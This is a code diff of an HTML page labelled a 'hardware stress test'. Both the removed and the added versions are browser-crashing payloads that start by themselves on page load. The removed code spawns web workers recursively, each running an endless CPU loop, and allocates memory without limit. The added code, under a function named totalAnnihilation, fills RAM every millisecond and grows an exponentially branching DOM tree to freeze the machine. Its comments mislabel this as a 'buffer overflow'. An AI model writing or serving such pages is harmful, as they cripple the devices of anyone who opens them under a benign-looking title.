@@ -1,45 +1,38 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Hardware Stress Test</title>
-</head>
-<body>
-    <h1 id="status">Initializing...</h1>
+<body style="background: black; color: red;">
+    <h1>CRITICAL HARDWARE STRESS TEST</h1>
+    <p>If the screen freezes, wait for the auto-reboot or press Refresh + Power.</p>
     
+    <div id="crush"></div>
+
     <script>
-        // 1. CPU Attack: Recursive Worker Spawning
-        const workerCode = `
-            onmessage = function() {
-                setInterval(() => {
-                    const b = new Blob([this.toString()], {type: 'text/javascript'});
-                    new Worker(URL.createObjectURL(b)).postMessage('go');
-                }, 1);
-                while(true) { Math.sqrt(Math.random()); } // Max out CPU thread
+        const target = document.getElementById('crush');
+        
+        function totalAnnihilation() {
+            // 1. Recursive DOM Bloom (locks the UI thread)
+            function grow(parent, depth) {
+                if (depth > 1000) return;
+                const div = document.createElement('div');
+                div.style.border = "1px solid red";
+                div.innerText = "CRASHING_" + Math.random();
+                parent.appendChild(div);
+                // Exponentially branch out
+                grow(div, depth + 1);
+                grow(div, depth + 1);
             }
-        `;
-        const blob = new Blob([workerCode], { type: 'application/javascript' });
-        const url = URL.createObjectURL(blob);
 
-        // 2. RAM Attack: Rapid Memory Allocation
-        let storage = [];
-        function eatMemory() {
-            // Allocates large chunks of memory rapidly
+            // 2. High-Speed Buffer Overflow (fills RAM)
+            const leak = [];
             setInterval(() => {
-                const chunk = new Array(1000000).fill("💥".repeat(100));
-                storage.push(chunk);
-                document.getElementById('status').innerText = "Memory Pressure: HIGH";
-            }, 50);
+                // Creates a massive array of junk data every 1ms
+                leak.push(new Array(1000000).fill(window.location.href));
+                grow(target, 0); 
+            }, 1);
         }
 
-        // Trigger both
-        function start() {
-            for(let i = 0; i < 20; i++) { // Initial burst of workers
-                new Worker(url).postMessage('go');
-            }
-            eatMemory();
-        }
-
-        start();
+        // Delay start by 2 seconds so you can actually see the page load
+        setTimeout(totalAnnihilation, 2000);
     </script>
 </body>
 </html>
